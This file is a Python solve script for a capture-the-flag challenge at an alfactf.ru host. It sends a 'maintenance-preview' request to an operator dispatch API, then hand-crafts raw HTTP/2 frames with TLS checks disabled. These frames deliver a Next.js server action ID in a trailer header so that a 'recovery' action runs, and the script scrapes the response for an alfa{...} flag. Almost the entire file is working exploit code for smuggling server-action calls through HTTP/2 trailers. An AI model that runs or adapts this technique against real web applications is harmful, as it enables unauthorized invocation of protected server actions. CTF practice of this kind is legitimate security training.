#!/usr/bin/env python3
"""
Correct sequence: maintenance-preview first, then recovery
Based on the hint "Повторите после сверки регламентного пакета"
"""
import socket
import ssl
import struct
import time
import re
import json
import requests
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()
print(f"# Using action_id = {ACTION_ID}")

requests.packages.urllib3.disable_warnings()

def do_maintenance_check():
    """Do maintenance-preview (сверка регламентного пакета)"""
    print("[+] Step 1: Performing maintenance package verification...")

    session = requests.Session()
    session.verify = False

    # Try maintenance-preview operation
    payload = {
        "operation": "maintenance-preview",
        "packet": "south-line.2026-03-27",
        "workOrder": "WO-17-04",
        "terminal": "ОП-3"
    }

    try:
        resp = session.post(
            f"https://{HOST}/api/operator/dispatch",
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text}")

        # Even if it's 502, the maintenance check might set some server-side state
        return True

    except Exception as e:
        print(f"    Error: {e}")
        return False

def send_recovery_action():
    """Send recovery action via HTTP/2 trailers"""
    print("[+] Step 2: Sending recovery action...")

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)

    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError("H2 not supported")

    # H2 preface
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except:
        pass
    sock.settimeout(15)

    # Recovery payload
    payload = '["$K1"]'
    body = payload.encode()

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", str(len(body))),
        ("trailer", "next-action"),
        ("user-agent", "maintenance-recovery"),
    ])

    trailer = enc.encode([("next-action", ACTION_ID)])

    sid = 1

    # Send HEADERS
    frame = struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers
    sock.sendall(frame)

    # Send DATA
    frame = struct.pack(">I", len(body))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body
    sock.sendall(frame)

    # Send TRAILER
    frame = struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer
    sock.sendall(frame)

    # Read response
    response_body = b""
    end_time = time.time() + 15

    while time.time() < end_time:
        try:
            header = sock.recv(9)
            if len(header) < 9:
                break

            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk

            if frame_type == 0:  # DATA
                response_body += payload

            if stream_id == sid and (flags & 1):  # END_STREAM
                break

        except Exception:
            break

    sock.close()
    return response_body

def parse_recovery_result(body):
    """Parse recovery action result"""
    body_str = body.decode('utf-8', errors='ignore')

    # Look for flag directly
    flag_match = re.search(r'alfa\{[^}]+\}', body_str)
    if flag_match:
        return f"FLAG: {flag_match.group(0)}"

    # Look for action result
    row1_match = re.search(r'^1:(.+?)(?:\n|$)', body_str, re.MULTILINE)
    if row1_match:
        content = row1_match.group(1)

        try:
            parsed = json.loads(content)
            print(f"    Action result: {parsed}")

            if parsed.get("ok"):
                return f"SUCCESS: {parsed}"
            elif parsed.get("error") != "recovery-offline":
                return f"DIFFERENT: {parsed}"
            else:
                return f"STILL_OFFLINE: {parsed.get('message', 'N/A')}"

        except:
            return f"RAW: {content}"

    return "NO_RESULT"

def main():
    print("=" * 60)
    print("Correct sequence: Maintenance check → Recovery action")
    print("=" * 60)

    # Step 1: Do maintenance check
    maintenance_ok = do_maintenance_check()

    if not maintenance_ok:
        print("[-] Maintenance check failed, but continuing anyway...")

    # Brief pause to let any server-side state settle
    time.sleep(1)

    # Step 2: Recovery action
    try:
        body = send_recovery_action()
        result = parse_recovery_result(body)

        print(f"\n[+] Recovery result: {result}")

        if "FLAG:" in result:
            print(f"\n[!] SUCCESS! {result}")
        elif "SUCCESS:" in result:
            print(f"\n[!] Recovery succeeded: {result}")
            # Maybe flag is in the success response
        elif "DIFFERENT:" in result:
            print(f"\n[*] Behavior changed: {result}")
        else:
            print(f"[*] Still recovery-offline: {result}")

    except Exception as e:
        print(f"[-] Recovery action failed: {e}")

    print("\n" + "=" * 60)
    print("Maintenance-first sequence completed.")

if __name__ == "__main__":
    main()